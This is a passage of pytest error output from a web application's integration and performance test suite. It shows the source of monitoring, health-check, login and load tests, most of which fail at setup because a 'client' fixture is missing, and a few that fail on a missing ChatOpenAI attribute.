          response = await client.get("/monitoring/errors")

          assert response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
          data = response.json()
          assert "error" in data
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:383
_ ERROR at setup of TestMonitoringErrorScenarios.test_metrics_collection_failure _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 394
      @patch('app.core.metrics.get_system_metrics')
      async def test_metrics_collection_failure(self, mock_get_metrics, client: AsyncClient):
          """Test metrics endpoint when collection fails."""
          mock_get_metrics.side_effect = Exception("Metrics collection failed")

          response = await client.get("/monitoring/metrics")

          assert response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
          data = response.json()
          assert "error" in data
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:394
_ ERROR at setup of TestMonitoringErrorScenarios.test_health_check_partial_failure _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 405
      @patch('app.services.database.database_service')
      async def test_health_check_partial_failure(self, mock_db_service, client: AsyncClient):
          """Test health check with partial service failures."""
          # Mock database partially failing
          mock_db_service.health_check.return_value = {
              "status": "degraded",
              "database": "connected",
              "pool_status": None,  # Pool info unavailable
              "warning": "High connection usage"
          }

          response = await client.get("/health")

          # Should still return 200 but indicate degraded status
          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["status"] == "degraded"
          assert "warning" in str(data)
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:405
_ ERROR at setup of TestMonitoringPerformance.test_monitoring_endpoints_response_time _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 429
      @pytest.mark.slow
      async def test_monitoring_endpoints_response_time(self, client: AsyncClient):
          """Test that monitoring endpoints respond quickly."""
          import time

          with patch('app.services.database.database_service') as mock_db:
              mock_db.health_check.return_value = {"status": "healthy", "database": "connected"}

              start_time = time.time()
              response = await client.get("/health")
              end_time = time.time()

              assert response.status_code == status.HTTP_200_OK
              # Health check should respond within 1 second
              assert (end_time - start_time) < 1.0
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:429
_ ERROR at setup of TestMonitoringPerformance.test_concurrent_monitoring_requests _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 445
      @pytest.mark.slow
      async def test_concurrent_monitoring_requests(self, client: AsyncClient):
          """Test handling of concurrent monitoring requests."""
          import asyncio

          with patch('app.core.error_monitoring.get_error_summary') as mock_summary:
              mock_summary.return_value = {}

              # Make 5 concurrent requests
              tasks = []
              for _ in range(5):
                  task = client.get("/monitoring/errors")
                  tasks.append(task)

              responses = await asyncio.gather(*tasks)

              # All requests should succeed
              for response in responses:
                  assert response.status_code == status.HTTP_200_OK
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:445
_ ERROR at setup of TestMonitoringPerformance.test_large_error_summary_handling _
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 465
      @patch('app.core.error_monitoring.get_error_summary')
      async def test_large_error_summary_handling(self, mock_get_summary, client: AsyncClient):
          """Test handling of large error summaries."""
          # Create a large number of error types
          large_summary = {}
          for i in range(100):
              large_summary[f"error_type_{i}"] = ErrorMetric(
                  error_type=f"error_type_{i}",
                  count=i + 1,
                  last_occurrence=datetime.now(),
                  first_occurrence=datetime.now() - timedelta(hours=1),
                  paths=[f"/api/endpoint_{i}"],
                  status_codes=[400 + (i % 100)]
              )

          mock_get_summary.return_value = large_summary

          response = await client.get("/monitoring/errors")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert len(data["errors"]) == 100
          assert data["total_error_types"] == 100
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:465
_ ERROR at setup of TestMeetingToolsPerformance.test_agenda_creation_performance _
tests/performance/test_ai_operations_performance.py:199: in agenda_tool
    with patch('app.core.langgraph.tools.meeting_management.ChatOpenAI', return_value=mock_llm):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'app.core.langgraph.tools.meeting_management' from '/home/paul/boardroom-repo/app/core/langgraph/tools/meeting_management.py'> does not have the attribute 'ChatOpenAI'
_ ERROR at setup of TestMeetingToolsPerformance.test_decision_support_performance _
tests/performance/test_ai_operations_performance.py:205: in decision_tool
    with patch('app.core.langgraph.tools.meeting_management.ChatOpenAI', return_value=mock_llm):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'app.core.langgraph.tools.meeting_management' from '/home/paul/boardroom-repo/app/core/langgraph/tools/meeting_management.py'> does not have the attribute 'ChatOpenAI'
_ ERROR at setup of TestMeetingToolsPerformance.test_minutes_generation_performance _
tests/performance/test_ai_operations_performance.py:211: in minutes_tool
    with patch('app.core.langgraph.tools.meeting_management.ChatOpenAI', return_value=mock_llm):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'app.core.langgraph.tools.meeting_management' from '/home/paul/boardroom-repo/app/core/langgraph/tools/meeting_management.py'> does not have the attribute 'ChatOpenAI'
_ ERROR at setup of TestMeetingToolsPerformance.test_concurrent_tool_execution _
tests/performance/test_ai_operations_performance.py:199: in agenda_tool
    with patch('app.core.langgraph.tools.meeting_management.ChatOpenAI', return_value=mock_llm):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'app.core.langgraph.tools.meeting_management' from '/home/paul/boardroom-repo/app/core/langgraph/tools/meeting_management.py'> does not have the attribute 'ChatOpenAI'
__ ERROR at setup of TestMeetingToolsPerformance.test_tools_memory_efficiency __
tests/performance/test_ai_operations_performance.py:199: in agenda_tool
    with patch('app.core.langgraph.tools.meeting_management.ChatOpenAI', return_value=mock_llm):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'app.core.langgraph.tools.meeting_management' from '/home/paul/boardroom-repo/app/core/langgraph/tools/meeting_management.py'> does not have the attribute 'ChatOpenAI'
_ ERROR at setup of TestMeetingToolsPerformance.test_tool_response_time_consistency _
tests/performance/test_ai_operations_performance.py:199: in agenda_tool
    with patch('app.core.langgraph.tools.meeting_management.ChatOpenAI', return_value=mock_llm):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: in get_original
    raise AttributeError(
E   AttributeError: <module 'app.core.langgraph.tools.meeting_management' from '/home/paul/boardroom-repo/app/core/langgraph/tools/meeting_management.py'> does not have the attribute 'ChatOpenAI'
___ ERROR at setup of TestAPIPerformance.test_health_endpoint_response_time ____
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 25
      @patch('app.services.database.database_service')
      async def test_health_endpoint_response_time(self, mock_db_service, client: AsyncClient):
          """Test health endpoint responds within acceptable time."""
          mock_db_service.health_check.return_value = {
              "status": "healthy",
              "database": "connected"
          }

          start_time = time.time()
          response = await client.get("/health")
          end_time = time.time()

          response_time = end_time - start_time

          assert response.status_code == 200
          assert response_time < 0.5  # Should respond within 500ms

          # Log performance metric
          print(f"Health endpoint response time: {response_time:.3f}s")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:25
_____ ERROR at setup of TestAPIPerformance.test_auth_endpoint_performance ______
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 45
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_auth_endpoint_performance(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test authentication endpoint performance."""
          # Mock user and auth
          mock_user = Mock()
          mock_user.id = 1
          mock_user.email = "test@example.com"
          mock_user.hashed_password = "$2b$12$hashedpassword"
          mock_user.is_active = True
          mock_user.role = "user"

          mock_db_service.get_user_by_email.return_value = mock_user

          with patch('app.api.v1.auth.verify_password') as mock_verify_pwd, \
               patch('app.api.v1.auth.create_access_token') as mock_create_token:

              mock_verify_pwd.return_value = True
              mock_token = Mock()
              mock_token.access_token = "test_token"
              mock_token.expires_at = "2023-12-31T23:59:59"
              mock_create_token.return_value = mock_token

              start_time = time.time()
              response = await client.post("/api/v1/auth/user-login", json={
                  "email": "test@example.com",
                  "password": "TestPassword123!"
              })
              end_time = time.time()

              response_time = end_time - start_time

              assert response.status_code == 200
              assert response_time < 1.0  # Should respond within 1 second

              print(f"Auth login response time: {response_time:.3f}s")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:45
___ ERROR at setup of TestAPIPerformance.test_boardroom_creation_performance ___
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 82
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_boardroom_creation_performance(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test boardroom creation performance."""
          mock_verify.return_value = "user-thread-123"

          # Mock user
          mock_user = Mock()
          mock_user.id = 1
          mock_user.role = "admin"
          mock_db_service.get_user.return_value = mock_user

          # Mock boardroom creation
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.name = "Performance Test Boardroom"
          mock_db_service.create_boardroom.return_value = mock_boardroom

          headers = {"Authorization": "Bearer valid_token"}

          start_time = time.time()
          response = await client.post("/api/v1/boardroom/", json={
              "name": "Performance Test Boardroom",
              "description": "Testing performance",
              "settings": {"max_participants": 10}
          }, headers=headers)
          end_time = time.time()

          response_time = end_time - start_time

          assert response.status_code == 201
          assert response_time < 2.0  # Should respond within 2 seconds

          print(f"Boardroom creation response time: {response_time:.3f}s")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:82
______ ERROR at setup of TestAPIPerformance.test_concurrent_health_checks ______
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 117
      @patch('app.services.database.database_service')
      async def test_concurrent_health_checks(self, mock_db_service, client: AsyncClient):
          """Test concurrent health check performance."""
          mock_db_service.health_check.return_value = {
              "status": "healthy",
              "database": "connected"
          }

          concurrent_requests = 10

          start_time = time.time()

          # Create concurrent requests
          tasks = []
          for _ in range(concurrent_requests):
              task = client.get("/health")
              tasks.append(task)

          responses = await asyncio.gather(*tasks)

          end_time = time.time()
          total_time = end_time - start_time

          # All requests should succeed
          for response in responses:
              assert response.status_code == 200

          # Average response time should be reasonable
          avg_response_time = total_time / concurrent_requests
          assert avg_response_time < 1.0

          print(f"Concurrent health checks ({concurrent_requests}): {total_time:.3f}s total, {avg_response_time:.3f}s avg")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:117
_ ERROR at setup of TestAPIPerformance.test_monitoring_endpoint_scalability[5] _
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 150
      @pytest.mark.parametrize("request_count", [5, 10, 20])
      @patch('app.core.error_monitoring.get_error_summary')
      async def test_monitoring_endpoint_scalability(self, mock_get_summary, client: AsyncClient, request_count: int):
          """Test monitoring endpoint performance with different loads."""
          mock_get_summary.return_value = {}

          start_time = time.time()

          tasks = []
          for _ in range(request_count):
              task = client.get("/monitoring/errors")
              tasks.append(task)

          responses = await asyncio.gather(*tasks)

          end_time = time.time()
          total_time = end_time - start_time

          # All requests should succeed
          for response in responses:
              assert response.status_code == 200

          avg_response_time = total_time / request_count

          # Performance should scale reasonably
          assert avg_response_time < 2.0

          print(f"Monitoring endpoint scalability ({request_count} requests): {total_time:.3f}s total, {avg_response_time:.3f}s avg")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:150
_ ERROR at setup of TestAPIPerformance.test_monitoring_endpoint_scalability[10] _
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 150
      @pytest.mark.parametrize("request_count", [5, 10, 20])
      @patch('app.core.error_monitoring.get_error_summary')
      async def test_monitoring_endpoint_scalability(self, mock_get_summary, client: AsyncClient, request_count: int):
          """Test monitoring endpoint performance with different loads."""
          mock_get_summary.return_value = {}

          start_time = time.time()

          tasks = []
          for _ in range(request_count):
              task = client.get("/monitoring/errors")
              tasks.append(task)

          responses = await asyncio.gather(*tasks)

          end_time = time.time()
          total_time = end_time - start_time

          # All requests should succeed
          for response in responses:
              assert response.status_code == 200

          avg_response_time = total_time / request_count

          # Performance should scale reasonably
          assert avg_response_time < 2.0

          print(f"Monitoring endpoint scalability ({request_count} requests): {total_time:.3f}s total, {avg_response_time:.3f}s avg")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:150
_ ERROR at setup of TestAPIPerformance.test_monitoring_endpoint_scalability[20] _
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 150
      @pytest.mark.parametrize("request_count", [5, 10, 20])
      @patch('app.core.error_monitoring.get_error_summary')
      async def test_monitoring_endpoint_scalability(self, mock_get_summary, client: AsyncClient, request_count: int):
          """Test monitoring endpoint performance with different loads."""
          mock_get_summary.return_value = {}

          start_time = time.time()

          tasks = []
          for _ in range(request_count):
              task = client.get("/monitoring/errors")
              tasks.append(task)

          responses = await asyncio.gather(*tasks)

          end_time = time.time()
          total_time = end_time - start_time

          # All requests should succeed
          for response in responses:
              assert response.status_code == 200

          avg_response_time = total_time / request_count

          # Performance should scale reasonably
          assert avg_response_time < 2.0

          print(f"Monitoring endpoint scalability ({request_count} requests): {total_time:.3f}s total, {avg_response_time:.3f}s avg")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:150
______ ERROR at setup of TestLoadTesting.test_sustained_health_check_load ______
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 545
      @patch('app.services.database.database_service')
      async def test_sustained_health_check_load(self, mock_db_service, client: AsyncClient):
          """Test sustained load on health check endpoint."""
          mock_db_service.health_check.return_value = {
              "status": "healthy",
              "database": "connected"
          }

          duration_seconds = 5
          request_interval = 0.1  # Request every 100ms

          start_time = time.time()
          responses = []

          while time.time() - start_time < duration_seconds:
              response = await client.get("/health")
              responses.append(response)
              await asyncio.sleep(request_interval)

          end_time = time.time()
          actual_duration = end_time - start_time

          # Calculate metrics
          total_requests = len(responses)
          requests_per_second = total_requests / actual_duration
          success_rate = len([r for r in responses if r.status_code == 200]) / total_requests

          assert success_rate > 0.95  # At least 95% success rate
          assert requests_per_second > 5  # At least 5 requests per second

          print(f"Sustained load test: {total_requests} requests in {actual_duration:.1f}s")
          print(f"Rate: {requests_per_second:.1f} req/s, Success: {success_rate:.1%}")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/performance/test_performance.py:545
_____ ERROR at setup of TestLoadTesting.test_batch_request_performance[5] ______
file /home/paul/boardroom-repo/tests/performance/test_performance.py, line 578
      @pytest.mark.parametrize("batch_size", [5, 10, 20])
      async def test_batch_request_performance(self, client: AsyncClient, batch_size: int):
          """Test performance with different batch sizes."""
          with patch('app.services.database.database_service') as mock_db:
              mock_db.health_check.return_value = {"status": "healthy", "database": "connected"}

              start_time = time.time()

              # Send batch of concurrent requests
              tasks = [client.get("/health") for _ in range(batch_size)]
              responses = await asyncio.gather(*tasks)

              end_time = time.time()
              batch_time = end_time - start_time

              # All requests should succeed
